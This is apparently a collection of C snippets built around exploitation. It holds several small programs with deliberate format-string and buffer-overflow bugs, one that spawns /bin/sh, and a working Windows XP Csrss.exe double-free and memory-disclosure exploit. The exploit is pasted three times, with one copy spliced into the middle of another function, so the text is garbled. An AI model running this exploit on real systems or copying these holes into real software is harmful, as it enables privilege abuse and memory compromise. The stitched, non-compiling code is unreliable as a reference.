#include <stdio.h>
main(int argc, char **argv){
	char *str="Kiran Kumar";
	printf(argv[1]);
}

#include <stdio.h>
#include <string.h>

#define BUF_SIZE 1024

int main(int argc, char **argv) {
    char buf[BUF_SIZE];
    if(argc < 2) return 1;

    strncpy(buf, argv[1], BUF_SIZE-1);
    printf(buf);

    return 0;
}

#include <stdio.h>
#include <stdlib.h>
int main (int argc, char *argv[]) {
char buf[512];
if (argc < 2) { printf("%s\n","Failed"); 
return 1; 
}
snprintf(buf, sizeof(buf), argv[1]);
buf[sizeof (buf) - 1] = '\x00';
return 0;
}

#include <stdio.h>

static void
init ()
{
  printf ("init_array\n");
}

static void (*const init_array []) ()
      __attribute__ ((section (".init_array"), aligned (sizeof (void *))))
        = { init };

static void
fini ()
{
  printf ("fini_array\n");
}

static void (*const fini_array []) ()
      __attribute__ ((section (".fini_array"), aligned (sizeof (void *))))
        = { fini };

static void
ctor ()
{
  printf ("ctor\n");
}

static void (*const ctors []) ()
      __attribute__ ((section (".ctors"), aligned (sizeof (void *))))
        = { ctor };

static void
dtor ()
{
  printf ("dtor\n");
}

static void (*const dtors []) ()
      __attribute__ ((section (".dtors"), aligned (sizeof (void *))))
        = { dtor };

int
main ()
{
  printf ("main\n");
}

#include <stdio.h>
main(int argc, char **argv){
	char *shellcode ="/bin/sh";
	printf(system(shellcode));
}

#include<stdio.h>
#include<stdlib.h>
int main(int argc, char **argv)
{
    char text[1024];
    static int some_value = -72;

    strcpy(text, argv[1]); /* ignore the buffer overflow here */

    printf("This is how you print correctly:\n");
    printf("%s", text);
    printf("This is how not to print:\n");
    printf(text);

    printf("some_value @ 0x%08x = %d [0x%08x]", &some_value, some_value, some_value);
    return(0);
}

#include <stdio.h>
int main(int argc, char *argv[])
{
char* i = argv[1];
printf("You wrote: %s\n", i);
}


#include <stdio.h>
#include <ntsecapi.h>
 
#define UNICODE
#define MAGIC_VALUE 0x75b4cd40  // winsrv.dll data section
 
 
BOOL gFon=FALSE;
 
typedef LONG NTSTATUS;
typedef NTSTATUS (WINAPI *PNTRAISE)(NTSTATUS, 
                                    ULONG,
                                    ULONG,
                                    PULONG,
                                    UINT,
                                    PULONG);    
 
// Csrss.exe memory monitor thread
#include <stdio.h>
#include <windows.h>
#include <winbase.h>
#include <ntsecapi.h>
 
#define UNICODE
#define MAGIC_VALUE 0x75b4cd40  // winsrv.dll data section
 
 
BOOL gFon=FALSE;
 
typedef LONG NTSTATUS;
typedef NTSTATUS (WINAPI *PNTRAISE)(NTSTATUS, 
                                    ULONG,
                                    ULONG,
                                    PULONG,
                                    UINT,
                                    PULONG);    
 
// Csrss.exe memory monitor thread
// (Read csrss.exe memory disclosure exploit for details)
 
VOID WINAPI ReadBox2( LPVOID param ) 
{ 
 
    HWND hWindow,hButton,hText;
    DWORD hChunk,cHeader=0;
    int i=0,b=0;
    int gTemp;
    char lpTitle[300];
    char lpText[300];
    char lpBuff[500];
    ZeroMemory((LPVOID)lpTitle,250);
    ZeroMemory((LPVOID)lpText,250);
    ZeroMemory((LPVOID)lpBuff,300);
    Sleep(2000);
     
    for (;;)
    {
     
        lpText[0]=(BYTE)"";
        Sleep(1000);
        hWindow = FindWindow("#32770",NULL);
        ZeroMemory((LPVOID)lpTitle,250);
        ZeroMemory((LPVOID)lpText,250);
        ZeroMemory((LPVOID)lpBuff,300);
         
        if(hWindow != NULL)
        {
            GetWindowText(hWindow,(LPSTR)&lpTitle,250);
             
            if(strcmp(lpTitle,"Aa")!=0)
            {
                hText=FindWindowEx(hWindow,0,"static",0);
                 
                GetWindowText(hText,(LPSTR)&lpText,250);
                hText=GetNextWindow(hText,GW_HWNDNEXT);
                 
                GetWindowText(hText,(LPSTR)&lpText,250);
              
                cHeader=*(DWORD*)lpText;
                if( cHeader!=0)
                {
                       
                      if(cHeader >0x100000 && cHeader<0x400000)
                      {     
                            printf("\n**************************\n");
                            printf("Heap Chunk Found! Good Luck!\n");
                             printf("New Value: 0x%p",cHeader);
                           printf("\n**************************\n");
                             
                      }
                      else
                      {
                          printf("\n****************************\n");
                            printf("winsrv.dll data overwritten! \n");
                            printf("New Value: 0x%p",cHeader);
                            printf("\n****************************\n");
                            
                      }
                }  
                 else
                {
                    printf("\n****************************\n");
                    printf("nothing found! ");
                    printf("\n****************************\n");
                }  
                 
                cHeader=*(DWORD*)lpTitle;
                if( cHeader!=0)
                {
                       
                      if(cHeader >0x100000 && cHeader<0x400000)
                      {     
                            printf("\n**************************\n");
                            printf("Heap Chunk Found! Good Luck!\n");
                             printf("New Value: 0x%p",cHeader);
                           printf("\n**************************\n");
                             
                      }
                      else
                      {
                          printf("\n****************************\n");
                            printf("winsrv.dll data overwritten! \n");
                            printf("New Value: 0x%p",cHeader);
                            printf("\n****************************\n");
                            
                      }
                }    
                else
                {
                    printf("\n****************************\n");
                    printf("nothing found! ");
                    printf("\n****************************\n");
                }
                 
            }
             
            SendMessage(hWindow,WM_CLOSE,0,0); 
            ZeroMemory((LPVOID)lpTitle,250);
            ZeroMemory((LPVOID)lpText,250);
            ZeroMemory((LPVOID)lpBuff,300);
        }
        CloseHandle(hWindow);
    }
 
}
 
VOID WINAPI ReadBox( LPVOID param ) 
{ 
 
    HWND hWindow;
     
    for (;;)
    {
        Sleep(1000);
        if(!gFon)
        {
                 hWindow = FindWindow("#32770",NULL);
         
                 if(hWindow != NULL )
                 {
                  SendMessage(hWindow,WM_CLOSE,0,0);
                  }
        }
    }
 
}
 
 
int main()
{
  
  
   UNICODE_STRING uStr={5,5,L"fun!"};
   ULONG retValue,args[]={MAGIC_VALUE,MAGIC_VALUE,(ULONG)&uStr};
   PNTRAISE NtRaiseHardError; 
   DWORD dwThreadId;  
 
   byte  *ShellCode ="\x5C\x3F\x3F\x5C\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75";
                      
   int i=0;
    
   NtRaiseHardError=(PNTRAISE)GetProcAddress(GetModuleHandle("ntdll.dll"),
                                               "NtRaiseHardError");  
    system("cls");
    printf("##########################################\n");
    printf("### Microsoft Windows NtRaiseHardError ###\n");
    printf("### Csrss.exe-winsrv.dll Double-Free   ###\n");
    printf("## Ruben Santamarta www.reversemode.com ##\n");
    printf("##########################################\n");
    printf("## + Csrss.exe Double-Free     Exploit  ##\n");
    printf("## + Csrss.exe Memory Disclosure Exploit##\n");
    printf("##########################################\n");
    printf("# XP SP 2                                #\n");
    printf("##########################################\n\n");
    printf("\nThe exploit overwrites controlled addresses\n");
    printf("in winsrv.dll data section within Csrss.exe\n\n");
     
    CreateThread( NULL,              
                  0,                  
                 (LPTHREAD_START_ROUTINE)ReadBox,        
                  0,             
                  0,                 
                 &dwThreadId);
    
   // Seeding the heap               
   for(i=0;i<2;i++) MessageBoxA(0,"\x40\xcd\xb4\x75","\x40\xcd\xb4\x75", MB_SERVICE_NOTIFICATION);
     
   // Exploiting Csrss.exe Double-Free 
    
   printf("[*] Stage 1 -= Hitting Heap =-\n\n") ;        
   printf("[+] Corrupting the heap (11 attemps)\n\n");
     
   for( i=0; i<11; i++)
   {
            
           printf("#%d... ",i+1); 
           MessageBoxA(0, ShellCode,"A", MB_SERVICE_NOTIFICATION);
   }
     
    gFon=TRUE;
   
    printf("\n\n[*] Stage 2 -= Scanning winsrv.dll data section =-\n\n") ; 
    Sleep(2000);
     
    CreateThread( NULL,              
                  0,                  
                 (LPTHREAD_START_ROUTINE)ReadBox2,        
                  0,             
                  0,                 
                 NULL); 
     
    args[0]-=0x20;   
     
    // Exploiting Csrss.exe memory disclosure flaw
     
    for(i=0;i<0xF;i++)
    {
        args[0]+=4;   
        printf("\n#%d Reading at : [0x%p]\n",i,args[0]);                                      
        NtRaiseHardError(0x50000018,3,4,args,1,&retValue);
    }
    
    printf("\n[+] Exploit exiting\n\n");
    printf("#############################################################\n");
    printf("If you didn't find anything, run the exploit one more time!\n");
    printf("If you find a heap chunk address, enjoy!\n");
    printf("#############################################################\n");
   
   
 }
// (Read csrss.exe memory disclosure exploit for details)
 
VOID WINAPI ReadBox2( LPVOID param ) 
{ 
 
    HWND hWindow,hButton,hText;
    DWORD hChunk,cHeader=0;
    int i=0,b=0;
    int gTemp;
    char lpTitle[300];
    char lpText[300];
    char lpBuff[500];
    ZeroMemory((LPVOID)lpTitle,250);
    ZeroMemory((LPVOID)lpText,250);
    ZeroMemory((LPVOID)lpBuff,300);
    Sleep(2000);
     
    for (;;)
    {
     
        lpText[0]=(BYTE)"";
        Sleep(1000);
        hWindow = FindWindow("#32770",NULL);
        ZeroMemory((LPVOID)lpTitle,250);
        ZeroMemory((LPVOID)lpText,250);
        ZeroMemory((LPVOID)lpBuff,300);
         
        if(hWindow != NULL)
        {
            GetWindowText(hWindow,(LPSTR)&lpTitle,250);
             
            if(strcmp(lpTitle,"Aa")!=0)
            {
                hText=FindWindowEx(hWindow,0,"static",0);
                 
                GetWindowText(hText,(LPSTR)&lpText,250);
                hText=GetNextWindow(hText,GW_HWNDNEXT);
                 
                GetWindowText(hText,(LPSTR)&lpText,250);
              
                cHeader=*(DWORD*)lpText;
                if( cHeader!=0)
                {
                       
                      if(cHeader >0x100000 && cHeader<0x400000)
                      {     
                            printf("\n**************************\n");
                            printf("Heap Chunk Found! Good Luck!\n");
                             printf("New Value: 0x%p",cHeader);
                           printf("\n**************************\n");
                             
                      }
                      else
                      {
                          printf("\n****************************\n");
                            printf("winsrv.dll data overwritten! \n");
                            printf("New Value: 0x%p",cHeader);
                            printf("\n****************************\n");
                            
                      }
                }  
                 else
                {
                    printf("\n****************************\n");
                    printf("nothing found! ");
                    printf("\n****************************\n");
                }  
                 
                cHeader=*(DWORD*)lpTitle;
                if( cHeader!=0)
                {
                       
                      if(cHeader >0x100000 && cHeader<0x400000)
                      {     
                            printf("\n**************************\n");
                            printf("Heap Chunk Found! Good Luck!\n");
                             printf("New Value: 0x%p",cHeader);
                           printf("\n**************************\n");
                             
                      }
                      else
                      {
                          printf("\n****************************\n");
                            printf("winsrv.dll data overwritten! \n");
                            printf("New Value: 0x%p",cHeader);
                            printf("\n****************************\n");
                            
                      }
                }    
                else
                {
                    printf("\n****************************\n");
                    printf("nothing found! ");
                    printf("\n****************************\n");
                }
#include <stdio.h>
#include <windows.h>
#include <winbase.h>
#include <ntsecapi.h>
 
#define UNICODE
#define MAGIC_VALUE 0x75b4cd40  // winsrv.dll data section
 
 
BOOL gFon=FALSE;
 
typedef LONG NTSTATUS;
typedef NTSTATUS (WINAPI *PNTRAISE)(NTSTATUS, 
                                    ULONG,
                                    ULONG,
                                    PULONG,
                                    UINT,
                                    PULONG);    
 
// Csrss.exe memory monitor thread
// (Read csrss.exe memory disclosure exploit for details)
 
VOID WINAPI ReadBox2( LPVOID param ) 
{ 
 
    HWND hWindow,hButton,hText;
    DWORD hChunk,cHeader=0;
    int i=0,b=0;
    int gTemp;
    char lpTitle[300];
    char lpText[300];
    char lpBuff[500];
    ZeroMemory((LPVOID)lpTitle,250);
    ZeroMemory((LPVOID)lpText,250);
    ZeroMemory((LPVOID)lpBuff,300);
    Sleep(2000);
     
    for (;;)
    {
     
        lpText[0]=(BYTE)"";
        Sleep(1000);
        hWindow = FindWindow("#32770",NULL);
        ZeroMemory((LPVOID)lpTitle,250);
        ZeroMemory((LPVOID)lpText,250);
        ZeroMemory((LPVOID)lpBuff,300);
         
        if(hWindow != NULL)
        {
            GetWindowText(hWindow,(LPSTR)&lpTitle,250);
             
            if(strcmp(lpTitle,"Aa")!=0)
            {
                hText=FindWindowEx(hWindow,0,"static",0);
                 
                GetWindowText(hText,(LPSTR)&lpText,250);
                hText=GetNextWindow(hText,GW_HWNDNEXT);
                 
                GetWindowText(hText,(LPSTR)&lpText,250);
              
                cHeader=*(DWORD*)lpText;
                if( cHeader!=0)
                {
                       
                      if(cHeader >0x100000 && cHeader<0x400000)
                      {     
                            printf("\n**************************\n");
                            printf("Heap Chunk Found! Good Luck!\n");
                             printf("New Value: 0x%p",cHeader);
                           printf("\n**************************\n");
                             
                      }
                      else
                      {
                          printf("\n****************************\n");
                            printf("winsrv.dll data overwritten! \n");
                            printf("New Value: 0x%p",cHeader);
                            printf("\n****************************\n");
                            
                      }
                }  
                 else
                {
                    printf("\n****************************\n");
                    printf("nothing found! ");
                    printf("\n****************************\n");
                }  
                 
                cHeader=*(DWORD*)lpTitle;
                if( cHeader!=0)
                {
                       
                      if(cHeader >0x100000 && cHeader<0x400000)
                      {     
                            printf("\n**************************\n");
                            printf("Heap Chunk Found! Good Luck!\n");
                             printf("New Value: 0x%p",cHeader);
                           printf("\n**************************\n");
                             
                      }
                      else
                      {
                          printf("\n****************************\n");
                            printf("winsrv.dll data overwritten! \n");
                            printf("New Value: 0x%p",cHeader);
                            printf("\n****************************\n");
                            
                      }
                }    
                else
                {
                    printf("\n****************************\n");
                    printf("nothing found! ");
                    printf("\n****************************\n");
                }
                 
            }
             
            SendMessage(hWindow,WM_CLOSE,0,0); 
            ZeroMemory((LPVOID)lpTitle,250);
            ZeroMemory((LPVOID)lpText,250);
            ZeroMemory((LPVOID)lpBuff,300);
        }
        CloseHandle(hWindow);
    }
 
}
 
VOID WINAPI ReadBox( LPVOID param ) 
{ 
 
    HWND hWindow;
     
    for (;;)
    {
        Sleep(1000);
        if(!gFon)
        {
                 hWindow = FindWindow("#32770",NULL);
         
                 if(hWindow != NULL )
                 {
                  SendMessage(hWindow,WM_CLOSE,0,0);
                  }
        }
    }
 
}
 
 
int main()
{
  
  
   UNICODE_STRING uStr={5,5,L"fun!"};
   ULONG retValue,args[]={MAGIC_VALUE,MAGIC_VALUE,(ULONG)&uStr};
   PNTRAISE NtRaiseHardError; 
   DWORD dwThreadId;  
 
   byte  *ShellCode ="\x5C\x3F\x3F\x5C\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75";
                      
   int i=0;
    
   NtRaiseHardError=(PNTRAISE)GetProcAddress(GetModuleHandle("ntdll.dll"),
                                               "NtRaiseHardError");  
    system("cls");
    printf("##########################################\n");
    printf("### Microsoft Windows NtRaiseHardError ###\n");
    printf("### Csrss.exe-winsrv.dll Double-Free   ###\n");
    printf("## Ruben Santamarta www.reversemode.com ##\n");
    printf("##########################################\n");
    printf("## + Csrss.exe Double-Free     Exploit  ##\n");
    printf("## + Csrss.exe Memory Disclosure Exploit##\n");
    printf("##########################################\n");
    printf("# XP SP 2                                #\n");
    printf("##########################################\n\n");
    printf("\nThe exploit overwrites controlled addresses\n");
    printf("in winsrv.dll data section within Csrss.exe\n\n");
     
    CreateThread( NULL,              
                  0,                  
                 (LPTHREAD_START_ROUTINE)ReadBox,        
                  0,             
                  0,                 
                 &dwThreadId);
    
   // Seeding the heap               
   for(i=0;i<2;i++) MessageBoxA(0,"\x40\xcd\xb4\x75","\x40\xcd\xb4\x75", MB_SERVICE_NOTIFICATION);
     
   // Exploiting Csrss.exe Double-Free 
    
   printf("[*] Stage 1 -= Hitting Heap =-\n\n") ;        
   printf("[+] Corrupting the heap (11 attemps)\n\n");
     
   for( i=0; i<11; i++)
   {
            
           printf("#%d... ",i+1); 
           MessageBoxA(0, ShellCode,"A", MB_SERVICE_NOTIFICATION);
   }
     
    gFon=TRUE;
   
    printf("\n\n[*] Stage 2 -= Scanning winsrv.dll data section =-\n\n") ; 
    Sleep(2000);
     
    CreateThread( NULL,              
                  0,                  
                 (LPTHREAD_START_ROUTINE)ReadBox2,        
                  0,             
                  0,                 
                 NULL); 
     
    args[0]-=0x20;   
     
    // Exploiting Csrss.exe memory disclosure flaw
     
    for(i=0;i<0xF;i++)
    {
        args[0]+=4;   
        printf("\n#%d Reading at : [0x%p]\n",i,args[0]);                                      
        NtRaiseHardError(0x50000018,3,4,args,1,&retValue);
    }
    
    printf("\n[+] Exploit exiting\n\n");
    printf("#############################################################\n");
    printf("If you didn't find anything, run the exploit one more time!\n");
    printf("If you find a heap chunk address, enjoy!\n");
    printf("#############################################################\n");
   
   
 }
                 
            }
             
            SendMessage(hWindow,WM_CLOSE,0,0); 
            ZeroMemory((LPVOID)lpTitle,250);
            ZeroMemory((LPVOID)lpText,250);
            ZeroMemory((LPVOID)lpBuff,300);
        }
        CloseHandle(hWindow);
    }
 
}
 
VOID WINAPI ReadBox( LPVOID param ) 
{ 
 
    HWND hWindow;
     
    for (;;)
    {
        Sleep(1000);
        if(!gFon)
        {
                 hWindow = FindWindow("#32770",NULL);
         
                 if(hWindow != NULL )
                 {
                  SendMessage(hWindow,WM_CLOSE,0,0);
                  }
        }
    }
 
}
 
 
int main()
{
  
  
   UNICODE_STRING uStr={5,5,L"fun!"};
   ULONG retValue,args[]={MAGIC_VALUE,MAGIC_VALUE,(ULONG)&uStr};
   PNTRAISE NtRaiseHardError; 
   DWORD dwThreadId;  
 
   byte  *ShellCode ="\x5C\x3F\x3F\x5C\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75"
                     "\x40\xcd\xb4\x75\x40\xcd\xb4\x75";
                      
   int i=0;
    
   NtRaiseHardError=(PNTRAISE)GetProcAddress(GetModuleHandle("ntdll.dll"),
                                               "NtRaiseHardError");  
    system("cls");
    printf("##########################################\n");
    printf("### Microsoft Windows NtRaiseHardError ###\n");
    printf("### Csrss.exe-winsrv.dll Double-Free   ###\n");
    printf("## Ruben Santamarta www.reversemode.com ##\n");
    printf("##########################################\n");
    printf("## + Csrss.exe Double-Free     Exploit  ##\n");
    printf("## + Csrss.exe Memory Disclosure Exploit##\n");
    printf("##########################################\n");
    printf("# XP SP 2                                #\n");
    printf("##########################################\n\n");
    printf("\nThe exploit overwrites controlled addresses\n");
    printf("in winsrv.dll data section within Csrss.exe\n\n");
     
    CreateThread( NULL,              
                  0,                  
                 (LPTHREAD_START_ROUTINE)ReadBox,        
                  0,             
                  0,                 
                 &dwThreadId);
    
   // Seeding the heap               
   for(i=0;i<2;i++) MessageBoxA(0,"\x40\xcd\xb4\x75","\x40\xcd\xb4\x75", MB_SERVICE_NOTIFICATION);
     
   // Exploiting Csrss.exe Double-Free 
    
   printf("[*] Stage 1 -= Hitting Heap =-\n\n") ;        
   printf("[+] Corrupting the heap (11 attemps)\n\n");
     
   for( i=0; i<11; i++)
   {
            
           printf("#%d... ",i+1); 
           MessageBoxA(0, ShellCode,"A", MB_SERVICE_NOTIFICATION);
   }
     
    gFon=TRUE;
   
    printf("\n\n[*] Stage 2 -= Scanning winsrv.dll data section =-\n\n") ; 
    Sleep(2000);
     
    CreateThread( NULL,              
                  0,                  
                 (LPTHREAD_START_ROUTINE)ReadBox2,        
                  0,             
                  0,                 
                 NULL); 
     
    args[0]-=0x20;   
     
    // Exploiting Csrss.exe memory disclosure flaw
     
    for(i=0;i<0xF;i++)
    {
        args[0]+=4;   
        printf("\n#%d Reading at : [0x%p]\n",i,args[0]);                                      
        NtRaiseHardError(0x50000018,3,4,args,1,&retValue);
    }
    
    printf("\n[+] Exploit exiting\n\n");
    printf("#############################################################\n");
    printf("If you didn't find anything, run the exploit one more time!\n");
    printf("If you find a heap chunk address, enjoy!\n");
    printf("#############################################################\n");
   
   
 }

#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[])
{
char test[1024];
strcpy(test,argv[1]);
printf("You wrote:");
printf(test);
printf("\n");
}
